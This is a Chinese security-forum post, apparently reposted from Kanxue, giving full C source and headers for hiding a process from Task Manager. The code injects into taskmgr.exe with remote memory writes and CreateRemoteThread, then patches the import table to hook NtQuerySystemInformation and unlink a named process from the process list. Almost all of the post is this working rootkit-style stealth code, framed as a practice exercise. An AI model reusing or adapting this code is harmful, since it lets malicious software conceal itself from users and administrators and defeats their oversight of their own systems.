
# IAT HOOK 代码注入非 DLL

> 原文：[`www.pediy.com/kssd/pediy10/74569.html`](https://www.pediy.com/kssd/pediy10/74569.html)

使用代码注入来实现进程隐藏 而不是使用 DLL 注入来实现进程隐藏

没有什么高级技术 纯体力活 原理就不说了 只是没有通过 DLL 注入 来实现 HOOK API

纯粹注入代码 邪恶二进制上 也有个代码注入的 只是用了一个未公开的函数，我还看不懂

= =本来想用汇编写的 发现汇编注入代码远比 C 注入代码来的繁 所以用 C 实现了

主要功能就是 隐藏进程 不过 RING3 的似乎没多大用 练习而已

代码如下：

```c
// 需要编译成 release 版本 DEBUG 版本 对函数生成的跳转地址表
// jmp xxxxx  写入远程进程的时候 xxxxx 等于写入了一个全局变量
// 程序必然崩溃

#include "Iat_Hook.h"

char cPath[] = "taskmgr.exe";

void main(void)
{
  // 定义变量
  DWORD dwPid;
  HANDLE hProcess;
  DWORD dwSize = 2048;
  PVOID pRemoteAddress, pRemoteStructAddress, MyAddress;
  REMOTESTRUCT stRemoteStruct;

  // 遍历进程 寻找 taskmgr.exe 进程 ID
  dwPid = GetProcessPid(cPath);

  // open process 得到进程句柄
  hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);

  if(hProcess == NULL)
  {
    printf("open error code %d\n", GetLastError());
    return;
  }

  // 写入 替代函数
  MyAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(hProcess, MyAddress, myNtQuerySystemInformation, dwSize, NULL);

  // 初始化结构
  InitializeStruct(&stRemoteStruct, (DWORD)MyAddress, dwPid);

  // 写入结构
  pRemoteStructAddress = VirtualAllocEx(hProcess, NULL, sizeof(REMOTESTRUCT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(hProcess, pRemoteStructAddress, &stRemoteStruct, sizeof(REMOTESTRUCT), NULL);

  // 写入远程线程函数
  pRemoteAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(hProcess, pRemoteAddress, RemoteThread, dwSize, NULL);

  // 创建远程线程
  CreateRemoteThread(hProcess, NULL, 0, pRemoteAddress, pRemoteStructAddress, 0, 0);

  CloseHandle(hProcess);
}

DWORD __stdcall RemoteThread(PREMOTESTRUCT pRemoteStruct)
{
  FARPROC fpVirtualQuery;
  FARPROC fpVirtualProtect;
  FARPROC fpOpenProcess;
  FARPROC fpEnum;
  FARPROC fpGetProcAddress;
  FARPROC fpLoadLibrary;
  FARPROC fpFreeLibrary;
  FARPROC fpWriteMemory;
  FARPROC fplstrcmp;
  HANDLE hProcess = NULL;
  HMODULE hMods[256];
  DWORD dwNeed;
  HANDLE hPsapi;
  MEMORY_BASIC_INFORMATION stMem;
  HMODULE hKernel, hModule;
  PIMAGE_NT_HEADERS pImageNtHeaders;
  PIMAGE_OPTIONAL_HEADER pImageOptionalHeader;
  IMAGE_DATA_DIRECTORY ImageImport;
  PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor;
  PIMAGE_THUNK_DATA pImageThunkData;
  DWORD oldProtect;
  wchar_t *p = pRemoteStruct->cProcessName;

  // 初始化函数指针
  fpVirtualQuery = (FARPROC)pRemoteStruct->dwVirtualQuery;
  fpVirtualProtect = (FARPROC)pRemoteStruct->dwVirtualProtect;
  fpOpenProcess = (FARPROC)pRemoteStruct->dwOpenProcess;
  fpLoadLibrary = (FARPROC)pRemoteStruct->dwLoadLibrary;
  fpFreeLibrary = (FARPROC)pRemoteStruct->dwFreeLibrary;
  fpGetProcAddress = (FARPROC)pRemoteStruct->dwGetProcAddress;
  fpWriteMemory = (FARPROC)pRemoteStruct->dwWriteProcessMemory;
  fplstrcmp = (FARPROC)pRemoteStruct->dwlstrcmp;

  // 得到进程句柄
  hProcess = (HANDLE)fpOpenProcess(PROCESS_ALL_ACCESS, FALSE, pRemoteStruct->dwPid);

  if(!hProcess)
    return 0;

  // 得到模块基址 模块基址存放于 hMods[0]
  hPsapi = (HANDLE)fpLoadLibrary(pRemoteStruct->cDllName);
  fpEnum = (FARPROC)fpGetProcAddress(hPsapi, pRemoteStruct->cFunName);
  fpEnum(hProcess, hMods, sizeof(hMods), &dwNeed);
  fpFreeLibrary(hPsapi);

  hModule = hMods[0];

  // 改变内存属性 因为采用的不是 DLL 插入 NtQuerySystemInformation 的原始地址无法通过
  // 全局变量传递给 替代函数 这里通过把函数地址写入 kernel 的 PE 头 来实现 这样只需要在替代函数中读出地址就可以了
  hKernel = (HANDLE)fpLoadLibrary(pRemoteStruct->cKernel);
  fpVirtualQuery(hKernel, &stMem, sizeof(MEMORY_BASIC_INFORMATION));
  fpVirtualProtect(stMem.BaseAddress, stMem.RegionSize, PAGE_READWRITE, &stMem.Protect);
  fpWriteMemory(hProcess, (PBYTE)(hKernel)+4, &pRemoteStruct->dwNtQuerySystem, sizeof(DWORD), NULL);
  fpWriteMemory(hProcess, (PBYTE)(hKernel)+8, &pRemoteStruct->dwlstrcmpW, sizeof(DWORD), NULL);
  fpWriteMemory(hProcess, (PBYTE)(hKernel)+0x14, &p, sizeof(DWORD), NULL);
  fpVirtualProtect(stMem.BaseAddress, stMem.RegionSize, stMem.Protect, &oldProtect);

  // 查找导入表 找到存放 NtQuerySystemInformation
  pImageNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)*((PBYTE)hModule+0x3c) + (DWORD)hModule);
  pImageOptionalHeader = &pImageNtHeaders->OptionalHeader;
  ImageImport = pImageOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
  pImageImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(ImageImport.VirtualAddress + (DWORD)hModule);

  while(pImageImportDescriptor->Name)
  {
    if(0 == fplstrcmp(pRemoteStruct->cNtdll, (PSTR)(pImageImportDescriptor->Name + (DWORD)hModule)))
    {
      break;
    }
    pImageImportDescriptor++;
  }

  // 替换 NtQuerySystemInformation 的地址
  pImageThunkData = (PIMAGE_THUNK_DATA)(pImageImportDescriptor->FirstThunk + (DWORD)hModule);

  while(pImageThunkData->u1.Function)
  {
    if(pImageThunkData->u1.Function == pRemoteStruct->dwNtQuerySystem)
    {
      fpVirtualQuery(&pImageThunkData->u1.Function, &stMem, sizeof(MEMORY_BASIC_INFORMATION));
      fpVirtualProtect(stMem.BaseAddress, stMem.RegionSize, PAGE_READWRITE, &stMem.Protect);
      pImageThunkData->u1.Function = pRemoteStruct->dwMyAddress;
      break;
    }
    pImageThunkData++;
  }

  fpVirtualProtect(stMem.BaseAddress, stMem.RegionSize, stMem.Protect, &oldProtect);

  return 0;
}

NTSTATUS WINAPI myNtQuerySystemInformation (
          SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
      ULONG SystemInformationLength,
            PULONG ReturnLength)
{
  HANDLE hKernel;
  NTSTATUS ntStatus;
  wchar_t *pName;
  PSYSTEM_PROCESS_INFORMATION pCurrent, pForward;
  FARPROC fpNtQuerySystem;
  FARPROC fplstrcmpW;

  // 寻找 kernel32 的基址 准备读取需要用到的函数地址
  _asm
  {
    mov eax,fs:[0x30]
    mov eax,[eax+0xc]
    mov ecx,[eax+0x1c]
    mov ecx, [ecx]
    mov eax, [ecx+8]
    mov hKernel,eax
  }

  // 取得函数地址
  fpNtQuerySystem = *(FARPROC *)((DWORD)hKernel + 4);
  fplstrcmpW = *(FARPROC *)((DWORD)hKernel + 8);

  // 取得 需隐藏的进程名
  pName = *(wchar_t **)((DWORD)hKernel + 0x14);

  ntStatus = (NTQUERYSYSTEMINFORMATION)fpNtQuerySystem(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

  if (SystemProcessesAndThreadsInformation == SystemInformationClass)
  {
    pForward = NULL;
    pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

    while(pCurrent->NextEntryDelta)//检验是否到 最后一个进程结构
    {
      if(pCurrent->ProcessName.Buffer)
      {
        //_asm int 3
        if(0 == fplstrcmpW(pCurrent->ProcessName.Buffer, pName))
        {
          if(pForward)
          {
            if(pCurrent->NextEntryDelta)//隐藏的进程在链表中间
            {
              pForward->NextEntryDelta += pCurrent->NextEntryDelta;
            }
            else//隐藏的进程在链表末端
              pForward->NextEntryDelta = 0;
          }
          else //要隐藏的进程在链表头时
          {
            if(pCurrent->NextEntryDelta)
            {
              SystemInformation = (PBYTE)pCurrent + pCurrent->NextEntryDelta;
            }
            else
              SystemInformation = NULL;
          }
        }
      }
        pForward = pCurrent;
        pCurrent = (PSYSTEM_PROCESS_INFORMATION)(pCurrent->NextEntryDelta + (PBYTE)pForward);
    }
    //_asm int 3
  }

  return ntStatus;
}

// 得到进程 PID
DWORD GetProcessPid(char *cPath)
{
  PROCESSENTRY32 stProcess;
  HANDLE hSnap;
  BOOL bRet;
```



```
hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  

if(hSnap == INVALID_HANDLE_VALUE)  

{  

  printf("error\n");  

  return 0;  

}  

stProcess.dwSize = sizeof (PROCESSENTRY32);  

bRet = Process32First(hSnap, &stProcess);  

if(!bRet)  

{  

  printf("first error\n");  

  return 0;  

}  

do  

{  

  if(0 == strcmp(stProcess.szExeFile, cPath)) //find  process of target  

  {  

    break;  

  }  

}while(Process32Next(hSnap, &stProcess));  

//确认 是否找到 目标进程  

if(0 != strcmp(stProcess.szExeFile, "taskmgr.exe"))  

{  

  printf("can not find process\n");  

  return 0;  

}  

CloseHandle(hSnap);  

return stProcess.th32ProcessID;  

}  

VOID InitializeStruct(PREMOTESTRUCT pRemoteStruct, DWORD MyAddress, DWORD dwPid)  

{  

  HANDLE hNtdll;  

  HANDLE hKernel;  

  hNtdll = LoadLibrary("ntdll.dll");  

  pRemoteStruct->dwNtQuerySystem = (DWORD)GetProcAddress(hNtdll, "NtQuerySystemInformation");  

  FreeLibrary(hNtdll);  

  hKernel = LoadLibrary("kernel32.dll");  

  pRemoteStruct->dwVirtualProtect = (DWORD)GetProcAddress(hKernel, "VirtualProtect");  

  pRemoteStruct->dwVirtualQuery = (DWORD)GetProcAddress(hKernel, "VirtualQuery");  

  pRemoteStruct->dwOpenProcess = (DWORD)GetProcAddress(hKernel, "OpenProcess");  

  pRemoteStruct->dwGetProcAddress = (DWORD)GetProcAddress(hKernel, "GetProcAddress");  

  pRemoteStruct->dwFreeLibrary = (DWORD)GetProcAddress(hKernel, "FreeLibrary");  

  pRemoteStruct->dwLoadLibrary = (DWORD)GetProcAddress(hKernel, "LoadLibraryA");  

  pRemoteStruct->dwWriteProcessMemory = (DWORD)GetProcAddress(hKernel, "WriteProcessMemory");  

  pRemoteStruct->dwlstrcmp = (DWORD)GetProcAddress(hKernel, "lstrcmpA");  

  pRemoteStruct->dwlstrcmpW = (DWORD)GetProcAddress(hKernel, "lstrcmpW");  

  FreeLibrary(hKernel);  

  pRemoteStruct->dwMyAddress = MyAddress;  

  pRemoteStruct->dwPid = dwPid;  

  strcpy(pRemoteStruct->cDllName, "Psapi.dll");  

  strcpy(pRemoteStruct->cFunName, "EnumProcessModules");  

  strcpy(pRemoteStruct->cKernel,"Kernel32.dll");  

  strcpy(pRemoteStruct->cNtdll, "ntdll.dll");  

          //要隐藏的进程名  

  wcscpy(pRemoteStruct->cProcessName, L"explorer.exe");  

}
```

`Iat_Hook.h`

```
//头文件  

#include <windows.h>  

#include <stdio.h>  

#include <stdlib.h>  

#include <string.h>  

#include <tlhelp32.h>  

#include <imagehlp.h>  

#include "Winternl.h"  

#pragma comment(lib, "imagehlp")  

//类型声明  

typedef int NTSTATUS;  

typedef BOOL (__stdcall *ENUMPROCESSMODULES)(  

            HANDLE hProcess,  

            HMODULE* lphModule,  

            DWORD cb,  

            LPDWORD lpcbNeeded  

);  

typedef NTSTATUS (WINAPI *NTQUERYSYSTEMINFORMATION)(  

            SYSTEM_INFORMATION_CLASS SystemInformationClass,  

            PVOID SystemInformation,  

            ULONG SystemInformationLength,  

            PULONG ReturnLength  

);  

typedef struct _REMOTE_STRUCT  

{  

  DWORD dwNtQuerySystem;  

  DWORD dwVirtualQuery;  

  DWORD dwVirtualProtect;  

  DWORD dwOpenProcess;  

  DWORD dwMessageBox;  

  DWORD dwLoadLibrary;  

  DWORD dwGetProcAddress;  

  DWORD dwFreeLibrary;  

  DWORD dwWriteProcessMemory;  

  DWORD dwlstrcmp;  

  DWORD dwlstrcmpW;  

  DWORD dwEnum;  

  DWORD dwMyAddress;  

  DWORD dwPid;  

  char cDllName[50];  

  char cFunName[50];  

  char cKernel[50];  

  char cNtdll[50];  

  wchar_t cProcessName[50];//要隐藏的进程名  

}REMOTESTRUCT, *PREMOTESTRUCT;  

//函数声明  

DWORD GetProcessPid(char *cPath);  

DWORD __stdcall RemoteThread(PREMOTESTRUCT pRemoteStruct);  

VOID InitializeStruct(PREMOTESTRUCT pRemoteStruct, DWORD MyAddress, DWORD dwPid);  

NTSTATUS WINAPI myNtQuerySystemInformation   (  

             SYSTEM_INFORMATION_CLASS SystemInformationClass,  

         PVOID SystemInformation,  

           ULONG SystemInformationLength,  

                 PULONG ReturnLength);
```

`Winternl.h`

```
typedef struct _UNICODE_STRING {   

  USHORT Length;   

  USHORT MaximumLength;   

  PWSTR   Buffer;                 //注意，这里为 Unicode 类型  

} UNICODE_STRING, *PUNICODE_STRING;  

typedef enum _SYSTEM_INFORMATION_CLASS {  

SystemBasicInformation,  

SystemProcessorInformation,  

SystemPerformanceInformation,  

SystemTimeOfDayInformation,  

SystemNotImplemented1,  

SystemProcessesAndThreadsInformation,  

SystemCallCounts,  

SystemConfigurationInformation,  

SystemProcessorTimes,  

SystemGlobalFlag,  

SystemNotImplemented2,  

SystemModuleInformation,  

SystemLockInformation,  

SystemNotImplemented3,  

SystemNotImplemented4,  

SystemNotImplemented5,  

SystemHandleInformation,  

SystemObjectInformation,  

SystemPagefileInformation,  

SystemInstructionEmulationCounts,  

SystemInvalidInfoClass1,  

SystemCacheInformation,  

SystemPoolTagInformation,  

SystemProcessorStatistics,  

SystemDpcInformation,  

SystemNotImplemented6,  

SystemLoadImage,  

SystemUnloadImage,  

SystemTimeAdjustment,  

SystemNotImplemented7,  

SystemNotImplemented8,  

SystemNotImplemented9,  

SystemCrashDumpInformation,  

SystemExceptionInformation,  

SystemCrashDumpStateInformation,  

SystemKernelDebuggerInformation,  

SystemContextSwitchInformation,  

SystemRegistryQuotaInformation,  

SystemLoadAndCallImage,  

SystemPrioritySeparation,  

SystemNotImplemented10,  

SystemNotImplemented11,  

SystemInvalidInfoClass2,  

SystemInvalidInfoClass3,  

SystemTimeZoneInformation,  

SystemLookasideInformation,  

SystemSetTimeSlipEvent,  

SystemCreateSession,  

SystemDeleteSession,  

SystemInvalidInfoClass4,  

SystemRangeStartInformation,  

SystemVerifierInformation,  

SystemAddVerifier,  

SystemSessionProcessesInformation  

} SYSTEM_INFORMATION_CLASS;  

typedef struct _SYSTEM_PROCESS_INFORMATION   

{   

    DWORD NextEntryDelta;   

    DWORD dThreadCount;   

    DWORD dReserved01;   

    DWORD dReserved02;   

    DWORD dReserved03;   

    DWORD dReserved04;   

    DWORD dReserved05;   

    DWORD dReserved06;   

    FILETIME ftCreateTime; /* relative to 01-01-1601 */   

    FILETIME ftUserTime; /* 100 nsec units */   

    FILETIME ftKernelTime; /* 100 nsec units */   

    UNICODE_STRING ProcessName;       //这就是进程名   

    DWORD BasePriority;   

    DWORD dUniqueProcessId;            //进程 ID   

    DWORD dParentProcessID;   

    DWORD dHandleCount;   

    DWORD dReserved07;   

    DWORD dReserved08;   

    DWORD VmCounters;   

    DWORD dCommitCharge;   

    PVOID ThreadInfos[1];   

} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;
```

后记：第一次没有照着书打代码，也找不到`C`注入代码的例子，能找到的都是`DLL`注入。原理早就知道了，真的写一遍不容易。整个编写的过程碰到了很多问题，最终都解决了，轻松了。
